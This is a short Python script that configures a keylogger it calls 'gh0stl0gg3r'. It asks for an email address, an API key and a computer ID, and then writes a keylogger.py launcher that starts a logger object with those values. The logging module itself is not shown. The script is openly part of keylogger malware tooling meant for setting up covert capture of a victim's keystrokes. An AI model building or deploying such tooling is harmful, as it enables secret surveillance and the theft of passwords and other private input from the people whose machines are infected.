#!/usr/bin/python3
# -*- coding: utf-8 -*-

#standard library imports
import os
import sys
from time import sleep


def start():
    mail = input('\nenter your Email: ')
    clave = input('Enter your API Key: ')
    id = input('type computer ID: ')
    os.system('clear')
    print('\n\n101010101010101010101010101010101010101010101010101010101010')
    print('\n\Mail = {0}, API = {1}, Computer Id = {2}\n'.format(str(mail), str(clave), str(id)))
    print('\n101010101010101010101010101010101010101010101010101010101010\n\n')
    check = input('\n\tits correct? type (y)es or (n)o: ')
    os.system('clear')
    if check == 'y':
        file = '#!/usr/bin/python3\n# -*- coding: utf-8 -*-\n\n'
        file += 'import logger\n\n'
        file += 'gh0stl0gg3r = logger.L0gg3r("{0}", "{1}", "{2}")\n'.format(str(mail), str(clave), str(id))
        file += 'gh0stl0gg3r.start()'
        with open('keylogger.py', 'w') as f:
            f.write(file)
            f.close()

        print('\n\t10101010101THANKS10FOR01USING01GH0STL0GG3R101010101010101')
    else:
        start()


start()
